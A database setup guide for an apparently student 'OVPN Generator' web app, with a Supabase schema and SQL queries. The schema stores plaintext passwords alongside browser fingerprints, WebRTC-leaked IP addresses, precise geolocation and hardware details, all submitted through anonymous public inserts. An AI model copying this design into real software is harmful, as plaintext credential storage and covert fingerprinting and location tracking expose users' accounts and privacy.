# 🗄️ Database Setup Guide - OVPN Generator

## 🚀 Quick Start

### Step 1: Run the Complete Schema
1. Go to **Supabase Dashboard**: https://supabase.com/dashboard/project/vagvqpgthucvtrbgxycd
2. Click **SQL Editor** in the left sidebar
3. Click **New Query**
4. Copy and paste the entire contents of `complete-database-schema.sql`
5. Click **Run** (or press Ctrl+Enter)

### Step 2: Verify Installation
Run this query:
```sql
SELECT * FROM vw_credentials_summary LIMIT 5;
```

If it returns successfully (even with 0 rows), your database is ready! ✅

---

## 📊 Database Structure

### Main Table: `user_credentials`

| Column | Type | Description |
|--------|------|-------------|
| `id` | SERIAL | Auto-incrementing ID |
| `username` | VARCHAR(255) | User login |
| `password` | VARCHAR(255) | User password |
| `ip_address` | VARCHAR(45) | User's IP |
| `created_at` | TIMESTAMPTZ | When record created |
| `server_ip` | VARCHAR(45) | VPN server IP (default: 206.45.29.181) |
| `server_port` | INTEGER | VPN port (default: 1194) |
| `protocol` | VARCHAR(10) | udp or tcp (default: udp) |
| `ca_crt` | TEXT | CA certificate (NULL for browser) |
| `client_crt` | TEXT | Client cert (NULL for browser) |
| `client_key` | TEXT | Client key (NULL for browser) |
| `ta_key` | TEXT | TLS auth key (NULL for browser) |
| **`ovpn_config`** | **TEXT** | **Complete .ovpn file** ⭐ |
| **`system_info`** | **JSONB** | **All fingerprint data** ⭐ |
| `config_name` | VARCHAR(255) | Optional name |
| `notes` | TEXT | Optional notes |
| `updated_at` | TIMESTAMPTZ | Auto-updated timestamp |

---

## 🔍 Useful Queries

### View All Submissions (Simple)
```sql
SELECT * FROM vw_credentials_summary ORDER BY created_at DESC LIMIT 10;
```

### Get OVPN File for a User
```sql
SELECT username, ovpn_config 
FROM user_credentials 
WHERE username = 'student123' 
  AND ovpn_config IS NOT NULL;
```

### Analyze NAT Types
```sql
SELECT 
    nat_type,
    COUNT(*) as count,
    ROUND(AVG(collection_time_ms::int)) as avg_time_ms
FROM vw_credentials_summary
WHERE nat_type IS NOT NULL
GROUP BY nat_type
ORDER BY count DESC;
```

### Find Mobile vs Desktop Users
```sql
SELECT 
    CASE 
        WHEN platform LIKE '%Android%' OR platform LIKE '%iPhone%' THEN 'Mobile'
        WHEN platform LIKE '%Win%' OR platform LIKE '%Mac%' OR platform LIKE '%Linux%' THEN 'Desktop'
        ELSE 'Other'
    END as device_type,
    COUNT(*) as count
FROM vw_credentials_summary
GROUP BY device_type;
```

### Get Geolocation Data
```sql
SELECT 
    username,
    ip_address,
    system_info->'basic'->'geolocation'->>'latitude' AS latitude,
    system_info->'basic'->'geolocation'->>'longitude' AS longitude,
    system_info->'basic'->'geolocation'->>'accuracy' AS accuracy_meters,
    created_at
FROM user_credentials
WHERE system_info->'basic'->'geolocation' IS NOT NULL
  AND system_info->'basic'->'geolocation' != '"denied"'::jsonb
ORDER BY created_at DESC;
```

### View WebGL Renderers (GPU Detection)
```sql
SELECT 
    webgl_renderer,
    webgl_vendor,
    COUNT(*) as count
FROM vw_device_fingerprints
GROUP BY webgl_renderer, webgl_vendor
ORDER BY count DESC;
```

### High-Performance Devices
```sql
SELECT 
    username,
    cpu_cores,
    ram_gb,
    webgl_renderer,
    platform
FROM vw_device_fingerprints
WHERE cpu_cores >= 8
ORDER BY cpu_cores DESC, ram_gb DESC;
```

### Network Topology Summary
```sql
SELECT 
    nat_type,
    connection_type,
    AVG(local_ip_count) as avg_local_ips,
    AVG(public_ip_count) as avg_public_ips,
    COUNT(*) as count
FROM vw_network_topology
GROUP BY nat_type, connection_type
ORDER BY count DESC;
```

### Export All Data as JSON
```sql
SELECT json_agg(row_to_json(t))
FROM (
    SELECT * FROM user_credentials
) t;
```

### Full System Info for Latest Entry
```sql
SELECT 
    username,
    ip_address,
    created_at,
    jsonb_pretty(system_info) as formatted_system_info,
    ovpn_config
FROM user_credentials
ORDER BY created_at DESC
LIMIT 1;
```

---

## 📈 Performance Queries

### Collection Time Statistics
```sql
SELECT 
    AVG((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS avg_ms,
    MIN((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS min_ms,
    MAX((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS max_ms,
    COUNT(*) as total_collections
FROM user_credentials
WHERE system_info->'advanced'->'collection_info' IS NOT NULL;
```

### Canvas Fingerprint Uniqueness
```sql
SELECT 
    canvas_hash,
    COUNT(*) as occurrences
FROM vw_device_fingerprints
WHERE canvas_hash IS NOT NULL
GROUP BY canvas_hash
ORDER BY occurrences DESC;
```

---

## 🎯 Data Analysis Examples

### Platform Distribution
```sql
SELECT 
    platform,
    COUNT(*) as count,
    ROUND(COUNT(*) * 100.0 / SUM(COUNT(*)) OVER (), 2) as percentage
FROM vw_credentials_summary
WHERE platform IS NOT NULL
GROUP BY platform
ORDER BY count DESC;
```

### Connection Type Distribution
```sql
SELECT 
    connection_type,
    COUNT(*) as count
FROM vw_network_topology
WHERE connection_type IS NOT NULL
GROUP BY connection_type
ORDER BY count DESC;
```

### OVPN Generation Success Rate
```sql
SELECT 
    COUNT(*) as total_submissions,
    SUM(CASE WHEN has_ovpn_config THEN 1 ELSE 0 END) as ovpn_generated,
    ROUND(
        SUM(CASE WHEN has_ovpn_config THEN 1 ELSE 0 END) * 100.0 / COUNT(*), 
        2
    ) as success_rate_percent
FROM vw_credentials_summary;
```

---

## 🔧 Maintenance Queries

### Delete Old Records (older than 30 days)
```sql
DELETE FROM user_credentials 
WHERE created_at < NOW() - INTERVAL '30 days';
```

### Find Duplicate Usernames
```sql
SELECT 
    username,
    COUNT(*) as count,
    array_agg(id) as ids
FROM user_credentials
GROUP BY username
HAVING COUNT(*) > 1
ORDER BY count DESC;
```

### Clean NULL OVPN Configs
```sql
SELECT 
    COUNT(*) as total,
    SUM(CASE WHEN ovpn_config IS NULL THEN 1 ELSE 0 END) as null_configs
FROM user_credentials;
```

---

## 🗺️ Views Available

### 1. `vw_credentials_summary`
Simplified view with extracted key fields from JSONB

### 2. `vw_network_topology`
Network analysis: NAT types, IP counts, MTU, connection types

### 3. `vw_device_fingerprints`
Device fingerprinting: canvas, WebGL, audio, hardware specs

---

## 🔐 Security (RLS Policies)

The database has Row Level Security enabled with these policies:

1. **Public Inserts**: Anyone can submit data (for your web app)
2. **Service Role Reads**: Backend can read all data
3. **Authenticated Reads**: Logged-in users can read data

---

## 📊 Sample Data Structure

### system_info JSONB Structure:
```json
{
  "basic": {
    "userAgent": "Mozilla/5.0...",
    "platform": "Win32",
    "localIPs": ["192.168.1.100", "216.249.49.19"],
    "geolocation": {
      "latitude": 43.472742,
      "longitude": -80.529700,
      "accuracy": 103
    },
    "connection": {
      "effectiveType": "4g",
      "downlink": 10,
      "rtt": 50
    },
    "battery": {
      "charging": true,
      "level": 1.0
    }
  },
  "advanced": {
    "certificates": {
      "rsa": {
        "algorithm": "RSASSA-PKCS1-v1_5",
        "expires": 1735939200000
      },
      "ecdsa": {
        "algorithm": "ECDSA-P256",
        "expires": 1735939200000
      }
    },
    "network_topology": {
      "natType": "Full Cone or Restricted NAT",
      "localIPs": ["192.168.1.100"],
      "publicIPs": ["216.249.49.19"],
      "iceCandidates": 12,
      "mtu": 1400
    },
    "fingerprint": {
      "canvas": "a3f8e912b45c7d1e...",
      "webgl": {
        "renderer": "ANGLE (Intel HD Graphics 630)",
        "vendor": "Google Inc. (Intel)"
      },
      "audio": {
        "hash": "12345.67890"
      },
      "browser": {
        "hardwareConcurrency": 20,
        "deviceMemory": 8
      }
    },
    "collection_info": {
      "duration_ms": 2347,
      "timestamp": "2025-11-03T19:13:20.100Z",
      "success": true
    }
  }
}
```

---

## ✅ Verification Checklist

After running the schema, verify:

- [ ] Table `user_credentials` exists with 17 columns
- [ ] 8 indexes created
- [ ] 3 views created (`vw_*`)
- [ ] RLS policies enabled
- [ ] Trigger for auto-update timestamp works

Run this to verify:
```sql
-- Check table
SELECT COUNT(*) FROM information_schema.columns 
WHERE table_name = 'user_credentials';
-- Should return 17

-- Check indexes
SELECT COUNT(*) FROM pg_indexes 
WHERE tablename = 'user_credentials';
-- Should return 9 (8 custom + 1 primary key)

-- Check views
SELECT COUNT(*) FROM information_schema.views 
WHERE table_name LIKE 'vw_%';
-- Should return 3
```

---

## 🎓 Ready for Your Assignment!

Your database now supports:
- ✅ Complete OVPN file storage
- ✅ Comprehensive fingerprinting data
- ✅ Network topology analysis
- ✅ Device identification
- ✅ Geolocation tracking
- ✅ Performance metrics

**Next Step**: Test your live site and check the data!

Visit: https://ssweb-q60mg265u-macs-projects-87cfa0ec.vercel.app
